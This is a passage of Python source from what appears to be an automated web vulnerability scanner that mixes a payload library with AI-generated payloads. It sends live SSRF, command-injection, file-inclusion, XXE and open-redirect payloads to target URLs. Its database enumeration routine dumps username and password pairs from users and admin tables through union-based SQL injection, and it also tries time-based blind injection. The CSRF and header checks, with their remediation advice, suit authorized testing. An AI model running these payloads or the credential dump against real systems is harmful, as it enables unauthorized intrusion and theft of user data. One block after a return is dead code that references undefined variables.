                        recommendations=[
                            "Use parameterized queries or prepared statements",
                            "Sanitize and validate all user input",
                            "Use ORM libraries that handle SQL escaping automatically",
                            "Implement input whitelisting",
                            "Use stored procedures with proper input validation"
                        ]
                    )
                
        except Exception as e:
            self._log(f"SQLi payload test error: {str(e)[:50]}", "warning")
        
        return None

    async def _test_ssrf(self, injection_point: Dict[str, Any]) -> Optional[VulnerabilityFinding]:
        """Test for SSRF using crafted internal targets."""
        url = injection_point['url']
        param = injection_point['parameter']
        method = injection_point.get('method', 'GET')
        payloads = self._get_attack_payloads(AttackType.SSRF, limit=8)
        targets = [
            "http://127.0.0.1:80",
            "http://localhost:3306",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd"
        ]
        if payloads:
            targets = payloads

        for payload in targets:
            try:
                test_url = self._inject_into_url(url, param, payload)
                async with self._semaphore:
                    async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        self.progress.requests_made += 1
                        self.progress.completed_tasks += 1
                        self._report_progress()
                        body = await response.text()
                        if response.status in {200, 302} and any(ind in body.lower() for ind in ["meta-data", "root:x", "ami-id", "172.16", "password"]):
                            finding = self._create_finding(
                                attack_type=AttackType.SSRF,
                                severity=SeverityLevel.HIGH,
                                title=f"Server-Side Request Forgery via '{param}'",
                                description="Target accepted external URL and returned internal resource indicators.",
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence=body[:400]
                            )
                            self._notify_finding(finding)
                            return finding
            except Exception as e:
                logger.debug(f"SSRF test error: {e}")
        return None

    async def _test_idor(self, injection_point: Dict[str, Any]) -> Optional[VulnerabilityFinding]:
        """Test for IDOR by incrementing/decrementing identifiers."""
        url = injection_point['url']
        param = injection_point['parameter']
        method = injection_point.get('method', 'GET')
        # Only attempt numeric-like parameters
        increments = ['1', '2', '10']
        base_values = ["1", "2"]
        for base in base_values:
            for inc in increments:
                test_value = str(int(base) + int(inc)) if base.isdigit() else inc
                test_url = self._inject_into_url(url, param, test_value)
                try:
                    async with self._semaphore:
                        async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                            self.progress.requests_made += 1
                            self.progress.completed_tasks += 1
                            self._report_progress()
                            body = await response.text()
                            # Heuristic: presence of email/username fields suggests data leakage
                            if response.status == 200 and any(marker in body.lower() for marker in ["email", "username", "account", "profile"]):
                                finding = self._create_finding(
                                    attack_type=AttackType.IDOR,
                                    severity=SeverityLevel.HIGH,
                                    title=f"Insecure Direct Object Reference on '{param}'",
                                    description="Changing object identifier returned different user data without authorization.",
                                    url=url,
                                    parameter=param,
                                    payload=test_value,
                                    evidence=body[:400]
                                )
                                self._notify_finding(finding)
                                return finding
                except Exception as e:
                    logger.debug(f"IDOR test error: {e}")
        return None

    async def _test_rce(self, injection_point: Dict[str, Any]) -> Optional[VulnerabilityFinding]:
        """Test for simple command injection/RCE."""
        url = injection_point['url']
        param = injection_point['parameter']
        payloads = self._get_attack_payloads(AttackType.RCE, limit=8)
        for payload in payloads:
            try:
                test_url = self._inject_into_url(url, param, payload)
                async with self._semaphore:
                    async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        self.progress.requests_made += 1
                        self.progress.completed_tasks += 1
                        self._report_progress()
                        body = await response.text()
                        if any(token in body.lower() for token in ["uid=", "gid=", "root:x", "www-data", "current user"]):
                            finding = self._create_finding(
                                attack_type=AttackType.RCE,
                                severity=SeverityLevel.CRITICAL,
                                title=f"Remote Command Execution via '{param}'",
                                description="Command injection indicators detected in response output.",
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence=body[:400]
                            )
                            self._notify_finding(finding)
                            return finding
            except Exception as e:
                logger.debug(f"RCE test error: {e}")
        return None

    async def _test_lfi(self, injection_point: Dict[str, Any]) -> Optional[VulnerabilityFinding]:
        """Test for Local File Inclusion."""
        url = injection_point['url']
        param = injection_point['parameter']
        payloads = self._get_attack_payloads(AttackType.LFI, limit=8)
        for payload in payloads:
            try:
                test_url = self._inject_into_url(url, param, payload)
                async with self._semaphore:
                    async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        self.progress.requests_made += 1
                        self.progress.completed_tasks += 1
                        self._report_progress()
                        body = await response.text()
                        if "root:x" in body or "[boot loader]" in body.lower():
                            finding = self._create_finding(
                                attack_type=AttackType.LFI,
                                severity=SeverityLevel.HIGH,
                                title=f"Local File Inclusion via '{param}'",
                                description="File inclusion payload returned system file contents.",
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence=body[:400]
                            )
                            self._notify_finding(finding)
                            return finding
            except Exception as e:
                logger.debug(f"LFI test error: {e}")
        return None

    async def _test_open_redirect(self, injection_point: Dict[str, Any]) -> Optional[VulnerabilityFinding]:
        """Test for open redirects using attacker domains."""
        url = injection_point['url']
        param = injection_point['parameter']
        payloads = self._get_attack_payloads(AttackType.OPEN_REDIRECT, limit=6)
        attacker_domain = "http://evil.example.com"
        if attacker_domain not in payloads:
            payloads.append(attacker_domain)

        for payload in payloads:
            try:
                test_url = self._inject_into_url(url, param, payload)
                async with self._semaphore:
                    async with self._session.get(test_url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        self.progress.requests_made += 1
                        self.progress.completed_tasks += 1
                        self._report_progress()
                        location = response.headers.get('Location', '')
                        if response.status in {301, 302, 303, 307} and attacker_domain in location:
                            finding = self._create_finding(
                                attack_type=AttackType.OPEN_REDIRECT,
                                severity=SeverityLevel.MEDIUM,
                                title=f"Open Redirect via '{param}'",
                                description="Parameter allowed redirection to external domain.",
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence=location
                            )
                            self._notify_finding(finding)
                            return finding
            except Exception as e:
                logger.debug(f"Open redirect test error: {e}")
        return None

    async def _test_xxe(self, injection_point: Dict[str, Any]) -> Optional[VulnerabilityFinding]:
        """Test for XML External Entity injection with file access indicator."""
        url = injection_point['url']
        param = injection_point['parameter']
        payloads = self._get_attack_payloads(AttackType.XXE, limit=6)
        if not payloads:
            payloads = [
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",
                "<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/hostname'>]><data>&file;</data>",
                "<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///proc/version'>]><test>&xxe;</test>"
            ]

        for payload in payloads:
            try:
                test_url = self._inject_into_url(url, param, payload)
                async with self._semaphore:
                    async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        self.progress.requests_made += 1
                        self.progress.completed_tasks += 1
                        self._report_progress()
                        body = await response.text()
                        # Check for file content leakage markers
                        file_markers = [
                            "root:x", "[fonts]", "[extensions]", "bin/bash", "usr/bin", 
                            "version", "linux", "microsoft", "windows", "hostname", 
                            "release", "kernel", "cpu", "memory"
                        ]
                        if any(marker in body.lower() for marker in file_markers):
                            finding = self._create_finding(
                                attack_type=AttackType.XXE,
                                severity=SeverityLevel.CRITICAL,
                                title=f"XML External Entity via '{param}'",
                                description="XXE payload retrieved local file content, indicating external entity expansion.",
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence=body[:400]
                            )
                            self._notify_finding(finding)
                            return finding
                        # Also check for XML parsing errors that might indicate XXE processing
                        xml_error_indicators = [
                            "xml parsing error", "entity", "doctype", "external entity",
                            "xml parser", "malformed xml", "invalid xml"
                        ]
                        if response.status >= 400 and any(indicator in body.lower() for indicator in xml_error_indicators):
                            # Potential XXE if server tries to parse XML and fails due to external entity
                            finding = self._create_finding(
                                attack_type=AttackType.XXE,
                                severity=SeverityLevel.HIGH,
                                title=f"Potential XML External Entity via '{param}'",
                                description="Server attempted to parse XML with external entities, causing parsing errors.",
                                url=url,
                                parameter=param,
                                payload=payload,
                                evidence=body[:400]
                            )
                            self._notify_finding(finding)
                            return finding
            except Exception as e:
                logger.debug(f"XXE test error: {e}")
        return None
    
    async def _enumerate_database(self, url: str, param: str, method: str = 'GET', db_type: str = 'mysql') -> Optional[str]:
        """
        Aggressively try to enumerate and dump database contents after finding SQLi vulnerability.

        Uses multiple techniques: error-based, union-based, and blind injection.
        Returns extracted database information including tables, columns, and data if successful.
        """
        self._log(f"🔍 Attempting aggressive database enumeration and dumping ({db_type})...", "info")

        extracted_info = []
        successful_dumps = 0

        # Phase 1: Error-based database fingerprinting and information disclosure
        error_payloads = [
            # MySQL version and database info
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND 1=CONVERT(int,(SELECT database()))--",
            "' AND 1=CONVERT(int,(SELECT user()))--",
            "' AND 1=CONVERT(int,(SELECT @@hostname))--",

            # MSSQL version and database info
            "'; SELECT @@version--",
            "'; SELECT db_name()--",
            "'; SELECT user_name()--",

            # PostgreSQL version and database info
            "'; SELECT version()--",
            "'; SELECT current_database()--",
            "'; SELECT current_user--",

            # SQLite version and database info
            "' UNION SELECT sqlite_version()--",
            "' UNION SELECT 'SQLite Database'--",
        ]

        for payload in error_payloads[:5]:  # Test first 5 error payloads
            try:
                if method == 'POST':
                    data = {param: payload}
                    async with self._semaphore:
                        async with self._session.post(url, json=data, timeout=aiohttp.ClientTimeout(total=15)) as response:
                            html = await response.text()
                            self.progress.requests_made += 1
                else:
                    test_url = self._inject_into_url(url, param, payload)
                    async with self._semaphore:
                        async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as response:
                            html = await response.text()
                            self.progress.requests_made += 1

                # Look for database information in error messages
                db_info_patterns = [
                    r'@@version:\s*([^\s<]+)',
                    r'database\(\):\s*([^\s<]+)',
                    r'user\(\):\s*([^\s<]+)',
                    r'@@hostname:\s*([^\s<]+)',
                    r'SQLite[^\s]*',
                    r'MySQL[^\s]*',
                    r'PostgreSQL[^\s]*',
                    r'Microsoft SQL Server[^\s]*',
                ]

                for pattern in db_info_patterns:
                    matches = re.findall(pattern, html, re.IGNORECASE)
                    if matches:
                        for match in matches:
                            if match not in extracted_info and len(match) > 2:
                                extracted_info.append(f"DB_INFO: {match}")
                                self._log(f"  📊 Found DB info: {match}", "success")

            except Exception as e:
                logger.debug(f"DB info extraction error: {e}")

        # Phase 2: Union-based table enumeration and data dumping
        union_payloads = []

        if db_type.lower() == 'mysql':
            union_payloads = [
                # MySQL table enumeration
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
                "' UNION SELECT CONCAT(table_name,':',table_type) FROM information_schema.tables--",

                # MySQL column enumeration
                "' UNION SELECT CONCAT(table_name,':',column_name) FROM information_schema.columns--",
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='admin'--",

                # MySQL data dumping - users table
                "' UNION SELECT CONCAT(id,':',username,':',password) FROM users--",
                "' UNION SELECT CONCAT(username,':',password) FROM users--",
                "' UNION SELECT CONCAT(email,':',password) FROM users--",

                # MySQL data dumping - admin table
                "' UNION SELECT CONCAT(username,':',password) FROM admin--",
                "' UNION SELECT CONCAT(username,':',password) FROM administrators--",

                # MySQL data dumping - other common tables
                "' UNION SELECT CONCAT(id,':',name,':',price) FROM products--",
                "' UNION SELECT CONCAT(username,':',email) FROM customers--",
            ]
        elif db_type.lower() == 'sqlite':
            union_payloads = [
                # SQLite table enumeration
                "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
                "' UNION SELECT sql FROM sqlite_master WHERE type='table'--",
                "' UNION SELECT name || ':' || sql FROM sqlite_master--",

                # SQLite data dumping - common tables
                "' UNION SELECT id || ':' || username || ':' || password FROM users--",
                "' UNION SELECT username || ':' || password FROM users--",
                "' UNION SELECT email || ':' || password FROM users--",
                "' UNION SELECT id || ':' || name || ':' || price FROM products--",
                "' UNION SELECT username || ':' || email FROM customers--",
            ]
        elif db_type.lower() == 'mssql':
            union_payloads = [
                # MSSQL table enumeration
                "'; SELECT name FROM sys.tables--",
                "'; SELECT name FROM sys.databases--",

                # MSSQL data dumping
                "'; SELECT username + ':' + password FROM users--",
                "'; SELECT login + ':' + pass FROM admin--",
            ]
        else:
            # Generic union payloads
            union_payloads = [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 'test','data'--",
            ]

        # Test union payloads
        for payload in union_payloads:
            try:
                if method == 'POST':
                    data = {param: payload}
                    async with self._semaphore:
                        async with self._session.post(url, json=data, timeout=aiohttp.ClientTimeout(total=15)) as response:
                            html = await response.text()
                            self.progress.requests_made += 1
                else:
                    test_url = self._inject_into_url(url, param, payload)
                    async with self._semaphore:
                        async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as response:
                            html = await response.text()
                            self.progress.requests_made += 1

                # Look for data patterns in response
                data_patterns = [
                    r'\b\d+:[^:]+:[^:]+',  # ID:Username:Password pattern
                    r'\b[^:]+:[^:]+',       # Username:Password pattern
                    r'\w+@\w+\.\w+:[^:]+', # Email:Password pattern
                    r'\busers?\b',          # Table names
                    r'\badmin\b',
                    r'\bproducts?\b',
                    r'\bcustomers?\b',
                    r'\borders?\b',
                    r'\bid|name|email|password|username\b',  # Column names
                ]

                for pattern in data_patterns:
                    matches = re.findall(pattern, html, re.IGNORECASE)
                    if matches:
                        for match in matches[:3]:  # Limit matches per pattern
                            clean_match = match.strip()
                            if clean_match not in extracted_info and len(clean_match) > 2:
                                extracted_info.append(f"DATA: {clean_match}")
                                self._log(f"  ✓ Dumped data: {clean_match[:60]}...", "success")
                                successful_dumps += 1

                # Also look for table/column information
                if 'information_schema' in html.lower() or 'sqlite_master' in html.lower():
                    extracted_info.append("DB_STRUCTURE: Database schema accessible")
                    self._log("  📋 Database structure accessible via injection", "success")

            except Exception as e:
                logger.debug(f"Union dump error: {e}")

        # Phase 3: Blind SQL injection attempts (time-based)
        if successful_dumps == 0:
            self._log("  ⏳ Attempting blind SQL injection detection...", "info")
            blind_payloads = [
                "' AND IF(1=1, SLEEP(2), 0)--",  # MySQL time-based
                "' AND 1=IF(1=1, SLEEP(2), 0)--",
                "'; IF 1=1 WAITFOR DELAY '0:0:2'--",  # MSSQL time-based
                "' AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RDS',2)--",  # Oracle
            ]

            for payload in blind_payloads[:2]:  # Test first 2 blind payloads
                try:
                    start_time = time.time()
                    if method == 'POST':
                        data = {param: payload}
                        async with self._semaphore:
                            async with self._session.post(url, json=data, timeout=aiohttp.ClientTimeout(total=20)) as response:
                                await response.text()
                                self.progress.requests_made += 1
                    else:
                        test_url = self._inject_into_url(url, param, payload)
                        async with self._semaphore:
                            async with self._session.get(test_url, timeout=aiohttp.ClientTimeout(total=20)) as response:
                                await response.text()
                                self.progress.requests_made += 1

                    elapsed = time.time() - start_time
                    if elapsed > 1.5:  # If response took more than 1.5 seconds
                        extracted_info.append(f"BLIND_SQLI: Time-based SQLi confirmed ({elapsed:.1f}s delay)")
                        self._log(f"  ⏰ Blind SQLi detected: {elapsed:.1f}s response time", "success")
                        break

                except Exception as e:
                    logger.debug(f"Blind SQLi test error: {e}")

        if extracted_info:
            self._log(f"📊 Database dump completed! Extracted {len(extracted_info)} items, {successful_dumps} successful dumps", "success")
            return "\\n".join(extracted_info[:100])  # Return up to 100 items
        else:
            self._log("  ❌ No database information could be extracted", "warning")
            return None
    
    async def _test_csrf_all_pages(self, pages: List[str]) -> List[VulnerabilityFinding]:
        """Test for CSRF vulnerabilities across all discovered pages."""
        all_findings = []
        tested_forms = set()  # Track tested form URLs to avoid duplicates
        
        self._log(f"Testing CSRF on {len(pages)} pages...", "info", force_flush=True)
        
        for page_url in pages:
            try:
                async with self._semaphore:
                    async with self._session.get(page_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        self.progress.requests_made += 1
                        html = await response.text()
                        headers = dict(response.headers)
                        
                        target_info = {
                            'url': page_url,
                            'html': html,
                            'headers': headers
                        }
                        
                        findings = await self._test_csrf(target_info)
                        
                        # Filter out duplicates based on form URL
                        for finding in findings:
                            form_key = finding.url
                            if form_key not in tested_forms:
                                tested_forms.add(form_key)
                                all_findings.append(finding)
                                
            except Exception as e:
                logger.debug(f"CSRF test error for {page_url}: {e}")
        
        if all_findings:
            self._log(f"Found {len(all_findings)} CSRF vulnerabilities!", "warning", force_flush=True)
        else:
            self._log(f"No CSRF vulnerabilities found in {len(pages)} pages", "info")
        
        return all_findings
    
    async def _test_csrf(self, target_info: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Test for CSRF vulnerabilities."""
        findings = []
        html = target_info.get('html', '')
        url = target_info.get('url', '')
        headers = target_info.get('headers', {})
        
        self._log(f"Testing CSRF protections at {url[:50]}...", "info")
        
        # Check for SameSite cookie attribute
        set_cookie = headers.get('Set-Cookie', '')
        has_samesite = 'samesite=' in set_cookie.lower()
        
        soup = BeautifulSoup(html, 'html.parser')
        
        # Check traditional forms
        for form in soup.find_all('form'):
            method = form.get('method', 'GET').upper()
            if method != 'POST':
                continue
            
            action = form.get('action', '')
            form_url = urljoin(url, action) if action else url
            
            # Check for CSRF token
            has_csrf = False
            csrf_patterns = ['csrf', 'token', '_token', 'authenticity', 'xsrf']
            
            for inp in form.find_all('input', type='hidden'):
                name = (inp.get('name') or '').lower()
                if any(pattern in name for pattern in csrf_patterns):
                    has_csrf = True
                    break
            
            if not has_csrf and not has_samesite:
                self._log(f"✓ CSRF vulnerability found in form at {form_url[:50]}...", "warning")
                finding = self._create_finding(
                    attack_type=AttackType.CSRF,
                    severity=SeverityLevel.MEDIUM,
                    title="Missing CSRF Protection",
                    description=f"POST form at {form_url} does not have CSRF token protection or SameSite cookie attribute.",
                    url=form_url,
                    recommendations=[
                        "Implement CSRF tokens for all state-changing forms",
                        "Use SameSite cookie attribute (SameSite=Strict or SameSite=Lax)",
                        "Verify Origin/Referer headers",
                        "Use custom request headers for API calls"
                    ]
                )
                findings.append(finding)
                self._notify_finding(finding)
        
        # Check for API endpoints (common in SPAs)
        api_patterns = ['/api/', '/rest/', '/graphql', '/v1/', '/v2/']
        if any(pattern in url.lower() for pattern in api_patterns):
            # Test if API accepts requests without CSRF token
            try:
                # Try a POST request to see if there's CSRF protection
                async with self._semaphore:
                    async with self._session.post(url, json={'test': 'data'}, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        self.progress.requests_made += 1
                        
                        # Check for CSRF-related headers
                        csrf_headers = ['X-CSRF-Token', 'X-XSRF-Token', 'X-Requested-With']
                        has_csrf_header = any(h in response.headers for h in csrf_headers)
                        
                        if response.status != 403 and not has_csrf_header and not has_samesite:
                            self._log(f"✓ CSRF vulnerability found in API endpoint {url[:50]}...", "warning")
                            finding = self._create_finding(
                                attack_type=AttackType.CSRF,
                                severity=SeverityLevel.MEDIUM,
                                title="API Endpoint Missing CSRF Protection",
                                description=f"API endpoint {url} accepts state-changing requests without CSRF tokens or custom headers.",
                                url=url,
                                evidence=f"Status: {response.status}, No CSRF headers found",
                                recommendations=[
                                    "Require custom headers (e.g., X-Requested-With: XMLHttpRequest)",
                                    "Use CSRF tokens in request headers",
                                    "Implement SameSite cookie attribute",
                                    "Validate Origin/Referer headers"
                                ]
                            )
                            findings.append(finding)
                            self._notify_finding(finding)
            except Exception as e:
                logger.debug(f"CSRF API test error: {e}")
        
        if not findings:
            self._log(f"  No CSRF vulnerabilities detected", "info")
        
        return findings
    
    async def _test_auth(self, url: str, target_info: Dict[str, Any]) -> List[VulnerabilityFinding]:
        """Test for authentication vulnerabilities."""
        findings = []
        html = target_info.get('html', '')
        headers = target_info.get('headers', {})
        
        # Check for insecure cookie settings
        set_cookie = headers.get('Set-Cookie', '')
        if set_cookie:
            if 'httponly' not in set_cookie.lower():
                finding = self._create_finding(
                    attack_type=AttackType.AUTH,
                    severity=SeverityLevel.MEDIUM,
                    title="Cookie Missing HttpOnly Flag",
                    description="Session cookies are accessible via JavaScript, making them vulnerable to XSS attacks.",
                    url=url,
                    evidence=set_cookie[:100]
                )
                findings.append(finding)
            
            if 'secure' not in set_cookie.lower() and url.startswith('https'):
                finding = self._create_finding(
                    attack_type=AttackType.AUTH,
                    severity=SeverityLevel.MEDIUM,
                    title="Cookie Missing Secure Flag",
                    description="Cookies may be transmitted over unencrypted connections.",
                    url=url
                )
                findings.append(finding)
        
        # Check for security headers
        security_headers = {
            'X-Frame-Options': 'Missing X-Frame-Options header (Clickjacking)',
            'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
            'Content-Security-Policy': 'Missing Content-Security-Policy header',
            'Strict-Transport-Security': 'Missing HSTS header'
        }
        
        for header, message in security_headers.items():
            if header.lower() not in [h.lower() for h in headers.keys()]:
                finding = self._create_finding(
                    attack_type=AttackType.AUTH,
                    severity=SeverityLevel.LOW,
                    title=message,
                    description=f"The {header} header is not set, which may expose the application to certain attacks.",
                    url=url
                )
                findings.append(finding)
        
        return findings
    
    def _inject_into_url(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, ''
        ))
    
    def _check_xss_reflection(self, html: str, payload: str, is_json: bool = False) -> bool:
        """Check if XSS payload is reflected in an exploitable way."""
        import html as html_lib
        import urllib.parse
        
        # Normalize for comparison
        html_lower = html.lower()
        payload_lower = payload.lower()
        
        # Direct unescaped reflection - most dangerous
        if payload in html:
            return True
        
        # Check for case-insensitive reflection
        if payload_lower in html_lower:
            return True
        
        # Check for dangerous patterns being reflected
        # These are the key XSS indicators that must NOT be escaped
        dangerous_patterns = [
            ('<script', '</script>'),
            ('onerror=', 'onerror='),
            ('onload=', 'onload='),
            ('onclick=', 'onclick='),
            ('onfocus=', 'onfocus='),
            ('onmouseover=', 'onmouseover='),
            ('<img', 'src='),
            ('<svg', 'onload='),
            ('<iframe', 'src='),
            ('javascript:', ''),
            ('<body', 'onload='),
        ]
        
        for pattern_start, pattern_check in dangerous_patterns:
            if pattern_start in payload_lower:
                # Check if this pattern appears unescaped in HTML
                if pattern_start in html_lower:
                    # Verify it's not HTML-escaped
                    escaped_pattern = html_lib.escape(pattern_start)
                    if escaped_pattern not in html and pattern_start in html_lower:
                        return True
        
        # Check specifically for script tags being reflected
        if '<script>' in payload_lower or '<script ' in payload_lower:
            if '<script>' in html_lower or '<script ' in html_lower:
                # Verify not escaped as &lt;script&gt;
                if '&lt;script' not in html_lower:
                    return True
        
        # Check for event handlers being reflected
        event_handlers = ['onerror', 'onload', 'onclick', 'onfocus', 'onmouseover', 'onmouseout', 
                         'onkeydown', 'onkeyup', 'onchange', 'onsubmit', 'ontoggle', 'onstart']
        for handler in event_handlers:
            if f'{handler}=' in payload_lower:
                if f'{handler}=' in html_lower:
                    return True
        
        # For JSON responses, check if HTML is reflected without JSON escaping
        if is_json:
            # In JSON, < and > should be escaped as \u003c and \u003e
            if '<' in payload and '<' in html and '\\u003c' not in html:
                return True
        
        return False

    def _extract_evidence(self, html: str, payload: str, context: int = 150) -> str:
        """Extract evidence snippet around the payload."""
        # Clean HTML tags from the response first
        import re
        clean_html = re.sub(r'<[^>]+>', '', html)
        clean_html = re.sub(r'\s+', ' ', clean_html).strip()
        
        idx = clean_html.find(payload)
        if idx == -1:
            # Fallback to original HTML if payload not found in clean version
            idx = html.find(payload)
            if idx == -1:
                return ""
            start = max(0, idx - context)
            end = min(len(html), idx + len(payload) + context)
            snippet = html[start:end]
            # Clean the snippet
            snippet = re.sub(r'<[^>]+>', '', snippet)
            snippet = re.sub(r'\s+', ' ', snippet).strip()
            return snippet
        
        start = max(0, idx - context)
        end = min(len(clean_html), idx + len(payload) + context)
        return clean_html[start:end]

    def _check_sqli_vulnerability(self, html: str, payload: str) -> bool:
        """Check if SQLi payload causes database errors or reveals vulnerability."""
        html_lower = html.lower()
        
        # Check for common SQL error patterns
        sql_error_patterns = [
            # MySQL errors
            "you have an error in your sql syntax",
            "mysql_fetch_array",
            "mysql_fetch_assoc", 
            "mysql_num_rows",
            "mysql error",
            "warning: mysql",
            
            # PostgreSQL errors
            "postgresql query failed",
            "pg_query",
            "pg_fetch",
            "syntax error at or near",
            
            # MSSQL errors
            "microsoft sql server",
            "mssql",
            "sql server error",
            "odbc sql server driver",
            
            # Oracle errors
            "ora-",
            "oracle error",
            
            # SQLite errors
            "sqlite3",
            "sqlite error",
            "unrecognized token",
            "near \"",
            "syntax error",
            
            # Generic SQL errors
            "sql error",
            "database error",
            "query failed",
            "invalid sql",
            "sql syntax",
            "unexpected end of sql command"
        ]
        
        # Check for exact error patterns
        for pattern in sql_error_patterns:
            if pattern in html_lower:
                return True
        
        # Check for regex patterns from the SQL_ERROR_PATTERNS
        for pattern, db_type in self.SQL_ERROR_PATTERNS:
            if re.search(pattern, html, re.IGNORECASE):
                return True
        
        # Check for data extraction patterns (union-based SQLi success)
        data_patterns = [
            r'\b\d+:[^:]+:[^:]+',  # ID:Username:Password pattern
            r'\badmin:[^:]+',       # Admin credentials
            r'\buser:[^:]+',        # User credentials  
            r'\w+@\w+\.\w+:[^:]+', # Email:Password pattern
            r'\busers?\b',          # Table names
            r'\badmin\b',
            r'\bproducts?\b',
            r'\bcustomers?\b',
            r'\binformation_schema\b',
            r'\bdatabase\b',
            r'\btable\b',
            r'\bcolumn\b'
        ]
        
        for pattern in data_patterns:
            if re.search(pattern, html, re.IGNORECASE):
                return True
        
        return False
        
        start = max(0, idx - context)
        end = min(len(clean_html), idx + len(payload) + context)
        
        return clean_html[start:end]
    
    def _create_finding(self, **kwargs) -> VulnerabilityFinding:
        """Create a new finding with auto-generated ID."""
        self._finding_counter += 1
        finding_id = f"PW-{self._finding_counter:04d}"
        
        if 'timestamp' not in kwargs:
            kwargs['timestamp'] = datetime.now()
        if 'confidence' not in kwargs:
            kwargs['confidence'] = 0.8
        if 'recommendations' not in kwargs:
            kwargs['recommendations'] = []
        
        return VulnerabilityFinding(id=finding_id, **kwargs)
    
    def _create_error_result(self, url: str, error: str) -> ScanResult:
        """Create an error result."""
        result = ScanResult(
            target_url=url,
            status="failed",
            start_time=self.progress.start_time,
            end_time=datetime.now(),
            duration_seconds=self.progress.elapsed_seconds
        )
        result.add_error(error)
        return result

    def _normalize_attack_types(self,
                                attack_types: Optional[List[AttackType]],
                                ai_recommendations: List[Any]) -> List[AttackType]:
        """Select attack types, preferring AI recommendations and skipping unsupported ones."""
        supported = {
            AttackType.XSS,
            AttackType.SQLI,
            AttackType.CSRF,
            AttackType.AUTH,
            AttackType.SSRF,
            AttackType.IDOR,
            AttackType.RCE,
            AttackType.LFI,
            AttackType.OPEN_REDIRECT,
            AttackType.XXE
        }

        # Prefer AI recommendations when user did not pin attacks
        if attack_types is None:
            attack_types = [rec.attack_type for rec in ai_recommendations if getattr(rec, "attack_type", None) in supported]

        # Fallback to empty list if still None
        attack_types = attack_types or []

        # Filter unsupported types and warn once
        unsupported = [at for at in attack_types if at not in supported]
        if unsupported:
            self._log(
                f"Skipping unsupported attack types: {', '.join(at.value for at in unsupported)}",
                "warning",
                force_flush=True
            )

        return [at for at in attack_types if at in supported]

    def _get_attack_payloads(self,
                              attack_type: AttackType,
                              category: Optional[str] = None,
                              db_hint: Optional[str] = None,
                              limit: int = 20) -> List[str]:
        """Fetch payloads from library plus AI-generated suggestions when available."""
        payloads: List[str] = []
        payload_objs_count = 0
        ai_payloads: List[str] = []

        if self.payloads:
            payload_objs = self.payloads.get_payloads(attack_type, limit=limit, category=category)
            payload_objs_count = len(payload_objs)
            payloads.extend([p.vector for p in payload_objs])

        # AI augmentation for context-aware payloads
        if hasattr(self.ai_model, "generate_payloads"):
            context = {"db": db_hint} if db_hint else {}
            try:
                ai_payloads = self.ai_model.generate_payloads(attack_type.value, context=context, max_payloads=5)
                payloads.extend(ai_payloads)
            except Exception as e:
                logger.debug(f"AI payload generation failed: {e}")

        # Deduplicate while preserving order
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)

        self._log(
            f"Payloads ready for {attack_type.value}: {len(unique_payloads)} (ai: {len(ai_payloads)}, library: {payload_objs_count})",
            "info",
            force_flush=True
        )

        self._log_op(
            "payload_set",
            {
                "attack_type": attack_type.value,
                "count": len(unique_payloads),
                "ai_count": len(ai_payloads),
                "library_count": payload_objs_count,
                "db_hint": db_hint,
                "sample": unique_payloads[:5]
            }
        )
        return unique_payloads[:limit]
    
    def _update_progress(self, phase: str, current: int, total: int):
        """Update progress information - throttled to prevent log spam."""
        # Only log if phase changed (prevents duplicate messages)
        if phase != self.progress.current_phase:
            self.progress.current_phase = phase
            logger.info(f"[{current}%] {phase}")
    
    def _report_progress(self):
        """Report current progress."""
        if self.on_progress:
            result = self.on_progress(self.progress)
            if asyncio.iscoroutine(result):
                asyncio.create_task(result)
    
    def _notify_finding(self, finding: VulnerabilityFinding):
        """Notify about a new finding."""
        self.progress.findings_count += 1
        logger.info(f"🔴 FOUND: {finding.title} ({finding.severity.value})")
        if self.on_finding:
            result = self.on_finding(finding)
            if asyncio.iscoroutine(result):
                asyncio.create_task(result)

